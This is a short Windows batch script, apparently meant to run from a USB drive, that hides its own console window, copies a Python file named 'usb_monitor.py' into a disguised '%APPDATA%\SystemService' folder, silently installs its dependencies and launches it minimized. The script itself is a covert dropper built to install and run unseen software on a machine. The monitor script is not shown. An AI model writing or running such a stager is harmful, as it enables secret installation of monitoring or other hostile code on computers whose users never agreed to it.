@echo off
REM Hide the command window
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

REM Get the current drive letter
for %%I in (.) do set DRIVE=%%~dI

REM Copy files to a hidden directory in AppData
if not exist "%APPDATA%\SystemService" mkdir "%APPDATA%\SystemService"
copy /Y "%DRIVE%\usb_monitor.py" "%APPDATA%\SystemService\"
copy /Y "%DRIVE%\requirements.txt" "%APPDATA%\SystemService\"

REM Install requirements if not already installed
python -m pip install -r "%APPDATA%\SystemService\requirements.txt" >nul 2>&1

REM Run the monitor script
start /MIN python "%APPDATA%\SystemService\usb_monitor.py"

exit
